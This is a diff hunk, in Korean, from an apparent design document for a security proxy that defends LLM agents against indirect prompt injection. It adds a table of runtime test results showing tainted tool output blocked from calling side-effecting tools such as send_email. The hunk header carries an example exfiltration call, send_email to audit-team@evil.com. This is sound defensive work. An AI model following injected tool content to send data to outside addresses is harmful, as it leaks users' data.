@@ -592,6 +592,20 @@ send_email(to = "audit-team@evil.com")
 - 완전한 방어(CaMeL)는 LLM을 감싸는 전용 인터프리터가 필요하고 프록시 자리에서는 불가능.
   대가로 "앱 코드 한 줄 안 바꾸고 적용된다"를 얻는다.
 
+
+**런타임 검증 (2026-08-24).** ②④ 를 실제 스택으로 확인했다 — uvicorn + Postgres/Redis/ClickHouse,
+업스트림 tool_calls 응답을 통제해 주입. 오염(role:tool)이 부작용 툴을 호출하면 차단, read-only
+툴이거나 비오염이면 통과:
+
+| 시나리오 | 결과 |
+|---|---|
+| 오염 + `send_email`(부작용) | blocked · finish_reason=content_filter · checkpoint=tool_call |
+| 오염 + `read_file`(read-only) | allow (tool_calls 유지) |
+| 비오염 + `send_email` | allow |
+| provenance + 외부 데이터 인수 | blocked (arguments=["to"]) |
+
+감사 행이 각 케이스의 action·checkpoint·tainted 를 기록한다. `is_tainted` 가 role:tool 을 오염으로
+잡고, taint→side_effect(read_only)→all→verdict(block) 프로그램이 tool_call 체크포인트에서 실행된다.
 ---
 
 ## 9. 스트리밍
